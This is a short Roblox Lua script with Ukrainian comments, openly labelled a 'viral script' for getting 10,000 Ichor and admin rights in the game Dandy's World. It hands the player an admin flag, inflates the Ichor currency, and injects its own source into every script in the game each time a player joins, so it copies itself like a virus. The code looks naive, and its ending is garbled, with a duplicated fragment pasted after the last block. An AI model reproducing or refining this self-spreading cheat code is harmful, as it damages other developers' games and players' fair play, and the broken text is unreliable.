-- Вірусний скрипт для отримання 10,000 іхора та адміністративних прав в Dandy's World

local function giveAdminRights(player)
    if player then
        -- Додаємо адміністративні права (це приклад, налаштування можуть бути інші)
        player.Admin = true
        print("Адміністративні права надано гравцеві: " .. player.Name)
    else
        print("Гравець не знайдений.")
    end
end

local function giveIchor(player, amount)
    if player and player:FindFirstChild("leaderstats") then
        local ichor = player.leaderstats:FindFirstChild("Ichor")
        if ichor then
            ichor.Value = ichor.Value + amount
            print("Ви отримали " .. amount .. " іхора!")
        else
            print("Ресурс 'Ichor' не знайдено.")
        end
    else
        print("Гравець не завантажений або відсутні leaderstats.")
    end
end

local function infectScripts()
    -- Отримуємо всі скрипти у грі
    local scripts = game:GetDescendants()
    for _, obj in ipairs(scripts) do
        if obj:IsA("Script") or obj:IsA("LocalScript") then
            -- Додаємо вірусний код до кожного скрипту
            obj.Source = obj.Source .. "\n\n-- Вірусний код\n" .. script.Source
            print("Скрипт " .. obj.Name .. " заражено.")
        end
    end
end

local function onPlayerAdded(player)
    -- Надання адміністративних прав та 10,000 іхора при додаванні гравця
    giveAdminRights(player)
    giveIchor(player, 10000)
    -- Зараження всіх скриптів у грі
    infectScripts()
end

game.Players.PlayerAdded:Connect(onPlayerAdded)

-- Надання адміністративних прав та 10,000 іхора поточному гравцеві
local currentPlayer = game.Players.LocalPlayer
if currentPlayer then
    giveAdminRights(currentPlayer)
    giveIchor(currentPlayer, 10000)
    -- Зараження всіх скриптів у грі
    infectScripts()
end іхора поточному гравцеві
local currentPlayer = game.Players.LocalPlayer
if currentPlayer then
    giveAdminRights(currentPlayer)
    giveIchor(currentPlayer, 10000)
end
